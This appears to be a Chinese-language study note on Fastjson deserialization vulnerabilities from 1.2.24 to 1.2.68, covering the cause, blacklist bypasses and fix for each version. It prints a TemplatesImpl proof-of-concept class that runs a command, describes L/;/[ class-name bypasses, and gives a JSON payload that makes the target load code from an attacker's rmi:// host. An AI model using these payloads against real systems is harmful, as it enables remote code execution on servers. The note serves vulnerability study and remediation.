# Fastjson 漏洞总结
## 前言
本次将详细学习fastjson反序列化这个漏洞，从各个版本的利用原理，绕过方式，修复方式等详细进行学习
# 1.2.24
## 漏洞分析
在fastjson中，想要将json反序列化为一个对象，常用的函数为praseObject。而在这个函数中，有一个神奇的功能叫autotype，这个功能的利用方式为控制json的key，value，key为固定的"@type"，然后将value设置为你想要反序列化成为的类的全路径，那么fastjson就会将你的json反序列化成为@type指定的类。
造成安全漏洞的原因就在这里，这个方法并没有对类做任何的黑名单或白名单限制。并且praseObject方法可以调用指定类的getter和setter方法。
## 利用方式一
安全研究者们找到了这样一个类 
<b>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</b>
而这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes生成java实例，这就达到fastjson通过字段传入一个类，再通过这个类被生成时执行构造函数。
```java
private Translet getTransletInstance() throws TransformerConfigurationException { .............
if (_class == null) 
defineTransletClasses();//通过ClassLoader加载字节码，存储在_class数组中
AbstractTranslet translet = (AbstractTranslet)_class[_transletIndex].newInstance();//新建实例，触发构造函数
............
```
那么我们分析一下下面的一个poc
```java
package com.fastjson.demo;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class poc extends AbstractTranslet {

    public poc() throws IOException {
        Runtime.getRuntime().exec("calc.exe");
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }

    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers) throws TransletException {

    }

    public static void main(String[] args) throws Exception {
        poc t = new poc();
    }
}
```
可以看到我们的构造函数设置成为了弹出计算器，那么当这个类被base64编码后设置为_bytecode，然后经过praseObject反序列化为我们指定好的TemplatesImpl类，由于存在_bytecode字段，就会被部分函数实例化为一个类，执行类生成时会执行的构造函数，实现远程命令执行
## 利用方式二
jndi是一个Java命令和目录接口，举个例子，通过jndi进行数据库操作，无需知道它数据库是mysql还是mssql，还是MongoDB等，它会自动识别
jav还有一个接口叫rmi，rmi也可以通过jndi实现，rmi的作用相当于在服务器上创建了类的仓库的api，客户端只用带着参数去请求，服务器进行一系列处理后，把运算后的参数还回来。
利用的大致思路为：
攻击者在本地搭建一个rmi的服务器，上面挂上恶意的payload
让被攻击的目标反序列化特定的类，这个类最终会调用lookup()函数，导致jndi接口指向我们的rmi服务器上的恶意payload
## 漏洞修复
在1.2.25之后，在ParserConfig.java中添加了public Class<?> checkAutoType(String typeName, Class<?> expectClass)过滤的函数
![](/images/1/66/image-6e3fc097c9b149aaa55607050a56d049.png)
注意其中的这一段，如果类的名字开头在deny名单里面，就直接抛出错误了
同时，设置了autotype开关，对@type字段进行限制。如果autotype开关关闭，则无法从@type字段传入类，同时autotype默认关闭
# 1.2.41-1.2.44
这四个版本可以说是官方非常偷懒导致的安全问题了
## 1.2.41
在这个版本中，checkAutotype函数会先检查传入的@type的值是否是在黑名单里，如果要反序列化的类不在黑名单中，那么才会对其进行反序列化。问题在于，在反序列化前，会经过loadClass函数进行处理，其中一个处理方法是：在加载类的时候会去掉className前后的L和;，所以，假如我们传入的类是Lcom.sun.rowset.JdbcRowSetImpl;，那么经过处理就变成了com.sun.rowset.JdbcRowSetImpl，完成了恶意类的传入
## 1.2.42
这个版本，官方只是对上一个版本进行了偷懒的修复，就是先判断传入的类开头和结尾是否为L和;，如果是，那就先去掉在进行判断。所以这个版本的绕过那就更简单了，直接双写，就可以完成
## 1.2.43
这个版本的修复也可以说是非常随意了，对开头是否为LL或结尾是否为;;进行判断，如果是，则直接抛出异常，但是fastjson不只是对开头L进行处理，开头[也会，所以攻击者用[开头，就可以绕过之前的所有过滤
## 1.2.44
终于，开发者忍不了了，他们直接判断开头如果为[或者结尾如果为;，就直接抛出异常，解决了缠绵多个版本的问题
# 1.2.47
## 漏洞分析
首先，fastJson有一个全局缓存机制：在解析json数据前会先加载相关配置，调用addBaseClassMappings和loadClass函数将一些基础类和第三方库存放到mappings中（mappings是ConcurrentMap类，所以我们在一次连接中传入两个键值a和b）
之后在解析时，如果没有开启autotype，会从mappings或deserializers.findClass函数中获取反序列化的对应类，如果有，则直接返回，绕过了黑名单
我们主要利用的是java.lang.Class类，其反序列化处理类MiscCodec类可以将任意类加载到mappings中，实现了目标
poc
```
{	
	"a":{
		"@type":"java.lang.Class",
		"val": "com.sun.rowset.JdbcRowSetImpl"
	},
	"b":{
		"@type":"com.sun.rowset.JdbcRowSetImpl",
		"dataSourceName":"rmi://xxx.xxx.xxx.xxx/exploit",
		"autoCommit":true
	}
}
```
## 漏洞修复
在fastjson1.2.48中，修复了这个bug，在MiscCodec中，处理Class类的地方，设置了fastjson cache为false，这样攻击类就不会被缓存了，也就不会被获取到了
# 1.2.68
## 漏洞利用
在fastjson中， 如果，@type 指定的类为 Throwable 的子类，那对应的反序列化处理类就会使用到 ThrowableDeserializer
而在ThrowableDeserializer#deserialze的方法中，当有一个字段的key也是 @type时，就会把这个 value 当做类名，然后进行一次 checkAutoType 检测。
并且指定了expectClass为Throwable.class，但是在checkAutoType中，有这样一约定，那就是如果指定了expectClass ，那么也会通过校验。
因为fastjson在反序列化的时候会尝试执行里面的getter方法，而Exception类中都有一个getMessage方法。
黑客只需要自定义一个异常，并且重写其getMessage就达到了攻击的目的。
## 漏洞修复
在1.2.69中被修复，主要修复方式是对于需要过滤掉的expectClass进行了修改，新增了4个新的类，并且将原来的Class类型的判断修改为hash的判断。
当然其实在1.2.68中，只要启用了safeMode，也可以规避这个漏洞
## safeMode
通过之前的分析可以看到，这些上述漏洞的利用几乎都是围绕AutoType来的，于是，在1.2.68版本中，引入了safeMode，配置safeMode后，无论白名单和黑名单，都不支持autoType，可一定程度上缓解反序列化Gadgets类变种攻击。
设置了safeMode后，@type 字段不再生效，即当解析形如{"@type": "com.java.class"}的JSON串时，将不再反序列化出对应的类。

参考链接：https://zhuanlan.zhihu.com/p/157211675?from_voters_page=true